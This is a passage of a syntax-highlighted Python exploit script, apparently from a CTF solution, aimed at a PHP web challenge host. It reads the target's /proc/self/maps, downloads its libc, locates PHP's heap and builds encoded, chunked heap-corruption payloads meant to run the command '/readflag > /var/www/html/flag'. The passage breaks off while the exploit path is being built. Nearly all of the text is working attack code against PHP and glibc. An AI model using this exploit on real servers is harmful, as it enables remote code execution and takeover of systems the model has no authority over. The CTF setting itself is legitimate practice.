</span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="n">BUG</span> <span class="o">=</span> <span class="s2">&#34;劄&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 12</span><span class="cl">
</span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://challenge.xinshi.fun:40793&#34;</span>
</span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="n">command</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;/readflag &gt; /var/www/html/flag;&#34;</span>
</span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="n">sleep</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="n">PAD</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">20</span>
</span></span><span class="line"><span class="ln"> 17</span><span class="cl"><span class="n">pad</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">20</span>
</span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="n">info</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="n">heap</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 20</span><span class="cl">
</span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="nd">@dataclass</span>
</span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="k">class</span> <span class="nc">Region</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 23</span><span class="cl">    <span class="s2">&#34;&#34;&#34;A memory region.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 24</span><span class="cl">
</span></span><span class="line"><span class="ln"> 25</span><span class="cl">    <span class="n">start</span><span class="p">:</span> <span class="nb">int</span>
</span></span><span class="line"><span class="ln"> 26</span><span class="cl">    <span class="n">stop</span><span class="p">:</span> <span class="nb">int</span>
</span></span><span class="line"><span class="ln"> 27</span><span class="cl">    <span class="n">permissions</span><span class="p">:</span> <span class="nb">str</span>
</span></span><span class="line"><span class="ln"> 28</span><span class="cl">    <span class="n">path</span><span class="p">:</span> <span class="nb">str</span>
</span></span><span class="line"><span class="ln"> 29</span><span class="cl">
</span></span><span class="line"><span class="ln"> 30</span><span class="cl">    <span class="nd">@property</span>
</span></span><span class="line"><span class="ln"> 31</span><span class="cl">    <span class="k">def</span> <span class="nf">size</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 32</span><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">stop</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">start</span>
</span></span><span class="line"><span class="ln"> 33</span><span class="cl">
</span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="c1"># 获取 /proc/self/maps</span>
</span></span><span class="line"><span class="ln"> 35</span><span class="cl"><span class="k">def</span> <span class="nf">get_maps</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 36</span><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;/maps&#39;</span>
</span></span><span class="line"><span class="ln"> 37</span><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="ln"> 38</span><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="ln"> 39</span><span class="cl">
</span></span><span class="line"><span class="ln"> 40</span><span class="cl"><span class="c1"># 获取 libc</span>
</span></span><span class="line"><span class="ln"> 41</span><span class="cl"><span class="k">def</span> <span class="nf">download_file</span><span class="p">(</span><span class="n">get_file</span> <span class="p">,</span> <span class="n">local_path</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 42</span><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;/libc&#39;</span>
</span></span><span class="line"><span class="ln"> 43</span><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">data</span><span class="p">,</span><span class="n">stream</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 44</span><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span>
</span></span><span class="line"><span class="ln"> 45</span><span class="cl">    <span class="nb">open</span><span class="p">(</span><span class="n">local_path</span><span class="p">,</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 46</span><span class="cl">    <span class="c1"># Path(local_path).write(data)</span>
</span></span><span class="line"><span class="ln"> 47</span><span class="cl">
</span></span><span class="line"><span class="ln"> 48</span><span class="cl"><span class="k">def</span> <span class="nf">get_regions</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 49</span><span class="cl">    <span class="n">maps</span> <span class="o">=</span> <span class="n">get_maps</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 50</span><span class="cl">    <span class="c1"># maps = maps.decode()</span>
</span></span><span class="line"><span class="ln"> 51</span><span class="cl">    <span class="n">PATTERN</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span>
</span></span><span class="line"><span class="ln"> 52</span><span class="cl">        <span class="sa">r</span><span class="s2">&#34;^([a-f0-9]+)-([a-f0-9]+)\b&#34;</span> <span class="sa">r</span><span class="s2">&#34;.*&#34;</span> <span class="sa">r</span><span class="s2">&#34;\s([-rwx]</span><span class="si">{3}</span><span class="s2">[ps])\s&#34;</span> <span class="sa">r</span><span class="s2">&#34;(.*)&#34;</span>
</span></span><span class="line"><span class="ln"> 53</span><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="ln"> 54</span><span class="cl">    <span class="n">regions</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="ln"> 55</span><span class="cl">    <span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="n">table</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">maps</span><span class="p">,</span> <span class="n">strip</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 56</span><span class="cl">        <span class="k">if</span> <span class="k">match</span> <span class="o">:=</span> <span class="n">PATTERN</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="n">region</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 57</span><span class="cl">            <span class="n">start</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 58</span><span class="cl">            <span class="n">stop</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 59</span><span class="cl">            <span class="n">permissions</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 60</span><span class="cl">            <span class="n">path</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 61</span><span class="cl">            <span class="k">if</span> <span class="s2">&#34;/&#34;</span> <span class="ow">in</span> <span class="n">path</span> <span class="ow">or</span> <span class="s2">&#34;[&#34;</span> <span class="ow">in</span> <span class="n">path</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 62</span><span class="cl">                <span class="n">path</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="ln"> 63</span><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 64</span><span class="cl">                <span class="n">path</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 65</span><span class="cl">            <span class="n">current</span> <span class="o">=</span> <span class="n">Region</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">stop</span><span class="p">,</span> <span class="n">permissions</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 66</span><span class="cl">            <span class="n">regions</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">current</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 67</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">maps</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 69</span><span class="cl">            <span class="c1"># failure(&#34;Unable to parse memory mappings&#34;)</span>
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">
</span></span><span class="line"><span class="ln"> 71</span><span class="cl">    <span class="c1"># self.log.info(f&#34;Got {len(regions)} memory regions&#34;)</span>
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">    <span class="k">return</span> <span class="n">regions</span>
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">
</span></span><span class="line"><span class="ln"> 75</span><span class="cl"><span class="c1"># 通过 /proc/self/maps 得到 堆地址</span>
</span></span><span class="line"><span class="ln"> 76</span><span class="cl"><span class="k">def</span> <span class="nf">find_main_heap</span><span class="p">(</span><span class="n">regions</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="n">Region</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="n">Region</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 77</span><span class="cl">    <span class="c1"># Any anonymous RW region with a size superior to the base heap size is a</span>
</span></span><span class="line"><span class="ln"> 78</span><span class="cl">    <span class="c1"># candidate. The heap is at the bottom of the region.</span>
</span></span><span class="line"><span class="ln"> 79</span><span class="cl">    <span class="n">heaps</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">        <span class="n">region</span><span class="o">.</span><span class="n">stop</span> <span class="o">-</span> <span class="n">HEAP_SIZE</span> <span class="o">+</span> <span class="mh">0x40</span>
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">        <span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">regions</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">        <span class="k">if</span> <span class="n">region</span><span class="o">.</span><span class="n">permissions</span> <span class="o">==</span> <span class="s2">&#34;rw-p&#34;</span>
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">        <span class="ow">and</span> <span class="n">region</span><span class="o">.</span><span class="n">size</span> <span class="o">&gt;=</span> <span class="n">HEAP_SIZE</span>
</span></span><span class="line"><span class="ln"> 84</span><span class="cl">        <span class="ow">and</span> <span class="n">region</span><span class="o">.</span><span class="n">stop</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">HEAP_SIZE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 85</span><span class="cl">        <span class="ow">and</span> <span class="n">region</span><span class="o">.</span><span class="n">path</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 86</span><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="ln"> 87</span><span class="cl">
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">heaps</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 89</span><span class="cl">        <span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Unable to find PHP&#39;s main heap in memory&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 90</span><span class="cl">
</span></span><span class="line"><span class="ln"> 91</span><span class="cl">    <span class="n">first</span> <span class="o">=</span> <span class="n">heaps</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="ln"> 92</span><span class="cl">
</span></span><span class="line"><span class="ln"> 93</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">heaps</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">        <span class="n">heaps</span> <span class="o">=</span> <span class="s2">&#34;, &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">heaps</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 95</span><span class="cl">        <span class="n">msg_info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Potential heaps: [i]</span><span class="si">{</span><span class="n">heaps</span><span class="si">}</span><span class="s2">[/] (using first)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 96</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 97</span><span class="cl">        <span class="n">msg_info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Using [i]</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">first</span><span class="p">)</span><span class="si">}</span><span class="s2">[/] as heap&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 98</span><span class="cl">
</span></span><span class="line"><span class="ln"> 99</span><span class="cl">    <span class="k">return</span> <span class="n">first</span>
</span></span><span class="line"><span class="ln">100</span><span class="cl">
</span></span><span class="line"><span class="ln">101</span><span class="cl"><span class="k">def</span> <span class="nf">_get_region</span><span class="p">(</span><span class="n">regions</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="n">Region</span><span class="p">],</span> <span class="o">*</span><span class="n">names</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Region</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">102</span><span class="cl">    <span class="s2">&#34;&#34;&#34;Returns the first region whose name matches one of the given names.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">103</span><span class="cl">    <span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="n">regions</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">104</span><span class="cl">        <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">name</span> <span class="ow">in</span> <span class="n">region</span><span class="o">.</span><span class="n">path</span> <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">names</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">105</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">106</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">107</span><span class="cl">        <span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Unable to locate region&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">108</span><span class="cl">
</span></span><span class="line"><span class="ln">109</span><span class="cl">    <span class="k">return</span> <span class="n">region</span>
</span></span><span class="line"><span class="ln">110</span><span class="cl">
</span></span><span class="line"><span class="ln">111</span><span class="cl"><span class="c1"># 下载 libc 文件</span>
</span></span><span class="line"><span class="ln">112</span><span class="cl"><span class="k">def</span> <span class="nf">get_symbols_and_addresses</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">113</span><span class="cl">    <span class="n">regions</span> <span class="o">=</span> <span class="n">get_regions</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">114</span><span class="cl">    <span class="n">LIBC_FILE</span> <span class="o">=</span> <span class="s2">&#34;/dev/shm/cnext-libc&#34;</span>
</span></span><span class="line"><span class="ln">115</span><span class="cl">
</span></span><span class="line"><span class="ln">116</span><span class="cl">    <span class="c1"># PHP&#39;s heap</span>
</span></span><span class="line"><span class="ln">117</span><span class="cl">
</span></span><span class="line"><span class="ln">118</span><span class="cl">    <span class="n">info</span><span class="p">[</span><span class="s2">&#34;heap&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">heap</span> <span class="ow">or</span> <span class="n">find_main_heap</span><span class="p">(</span><span class="n">regions</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">119</span><span class="cl">
</span></span><span class="line"><span class="ln">120</span><span class="cl">    <span class="c1"># Libc</span>
</span></span><span class="line"><span class="ln">121</span><span class="cl">
</span></span><span class="line"><span class="ln">122</span><span class="cl">    <span class="n">libc</span> <span class="o">=</span> <span class="n">_get_region</span><span class="p">(</span><span class="n">regions</span><span class="p">,</span> <span class="s2">&#34;libc-&#34;</span><span class="p">,</span> <span class="s2">&#34;libc.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">123</span><span class="cl">
</span></span><span class="line"><span class="ln">124</span><span class="cl">    <span class="n">download_file</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">LIBC_FILE</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">125</span><span class="cl">
</span></span><span class="line"><span class="ln">126</span><span class="cl">    <span class="n">info</span><span class="p">[</span><span class="s2">&#34;libc&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_FILE</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">127</span><span class="cl">    <span class="n">info</span><span class="p">[</span><span class="s2">&#34;libc&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">start</span>
</span></span><span class="line"><span class="ln">128</span><span class="cl">
</span></span><span class="line"><span class="ln">129</span><span class="cl"><span class="k">def</span> <span class="nf">compress</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">130</span><span class="cl">    <span class="s2">&#34;&#34;&#34;Returns data suitable for `zlib.inflate`.
</span></span></span><span class="line"><span class="ln">131</span><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">132</span><span class="cl">    <span class="c1"># Remove 2-byte header and 4-byte checksum</span>
</span></span><span class="line"><span class="ln">133</span><span class="cl">    <span class="k">return</span> <span class="n">zlib</span><span class="o">.</span><span class="n">compress</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">9</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">134</span><span class="cl">
</span></span><span class="line"><span class="ln">135</span><span class="cl"><span class="k">def</span> <span class="nf">b64</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">misalign</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">136</span><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">137</span><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">misalign</span> <span class="ow">and</span> <span class="n">payload</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">138</span><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Misaligned: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">139</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">140</span><span class="cl">
</span></span><span class="line"><span class="ln">141</span><span class="cl"><span class="k">def</span> <span class="nf">compressed_bucket</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">142</span><span class="cl">    <span class="s2">&#34;&#34;&#34;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">143</span><span class="cl">    <span class="k">return</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mh">0x8000</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">144</span><span class="cl">
</span></span><span class="line"><span class="ln">145</span><span class="cl"><span class="k">def</span> <span class="nf">qpe</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">146</span><span class="cl">    <span class="s2">&#34;&#34;&#34;Emulates quoted-printable-encode.
</span></span></span><span class="line"><span class="ln">147</span><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">148</span><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;=</span><span class="si">{</span><span class="n">x</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">149</span><span class="cl">
</span></span><span class="line"><span class="ln">150</span><span class="cl"><span class="k">def</span> <span class="nf">ptr_bucket</span><span class="p">(</span><span class="o">*</span><span class="n">ptrs</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">151</span><span class="cl">    <span class="s2">&#34;&#34;&#34;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">152</span><span class="cl">    <span class="k">if</span> <span class="n">size</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">153</span><span class="cl">        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">ptrs</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">==</span> <span class="n">size</span>
</span></span><span class="line"><span class="ln">154</span><span class="cl">    <span class="n">bucket</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">p64</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">155</span><span class="cl">    <span class="n">bucket</span> <span class="o">=</span> <span class="n">qpe</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">156</span><span class="cl">    <span class="n">bucket</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">157</span><span class="cl">    <span class="n">bucket</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">158</span><span class="cl">    <span class="n">bucket</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">159</span><span class="cl">    <span class="n">bucket</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">160</span><span class="cl">
</span></span><span class="line"><span class="ln">161</span><span class="cl">    <span class="k">return</span> <span class="n">bucket</span>
</span></span><span class="line"><span class="ln">162</span><span class="cl">
</span></span><span class="line"><span class="ln">163</span><span class="cl"><span class="k">def</span> <span class="nf">chunked_chunk</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">size</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">164</span><span class="cl">    <span class="s2">&#34;&#34;&#34;Constructs a chunked representation of the given chunk. If size is given, the
</span></span></span><span class="line"><span class="ln">165</span><span class="cl"><span class="s2">    chunked representation has size `size`.
</span></span></span><span class="line"><span class="ln">166</span><span class="cl"><span class="s2">    For instance, `ABCD` with size 10 becomes: `0004</span><span class="se">\n</span><span class="s2">ABCD</span><span class="se">\n</span><span class="s2">`.
</span></span></span><span class="line"><span class="ln">167</span><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">168</span><span class="cl">    <span class="c1"># The caller does not care about the size: let&#39;s just add 8, which is more than</span>
</span></span><span class="line"><span class="ln">169</span><span class="cl">    <span class="c1"># enough</span>
</span></span><span class="line"><span class="ln">170</span><span class="cl">    <span class="k">if</span> <span class="n">size</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">171</span><span class="cl">        <span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span>
</span></span><span class="line"><span class="ln">172</span><span class="cl">    <span class="n">keep</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">173</span><span class="cl">    <span class="n">size</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">keep</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">174</span><span class="cl">    <span class="k">return</span> <span class="n">size</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">data</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln">175</span><span class="cl">
</span></span><span class="line"><span class="ln">176</span><span class="cl"><span class="c1"># 攻击 payload 的生成</span>
</span></span><span class="line"><span class="ln">177</span><span class="cl"><span class="k">def</span> <span class="nf">build_exploit_path</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">178</span><span class="cl">    <span class="n">LIBC</span> <span class="o">=</span> <span class="n">info</span><span class="p">[</span><span class="s2">&#34;libc&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">179</span><span class="cl">    <span class="n">ADDR_EMALLOC</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;__libc_malloc&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">180</span><span class="cl">    <span class="n">ADDR_EFREE</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;__libc_system&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">181</span><span class="cl">    <span class="n">ADDR_EREALLOC</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;__libc_realloc&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">182</span><span class="cl">
</span></span><span class="line"><span class="ln">183</span><span class="cl">    <span class="n">ADDR_HEAP</span> <span class="o">=</span> <span class="n">info</span><span class="p">[</span><span class="s2">&#34;heap&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">184</span><span class="cl">    <span class="n">ADDR_FREE_SLOT</span> <span class="o">=</span> <span class="n">ADDR_HEAP</span> <span class="o">+</span> <span class="mh">0x20</span>
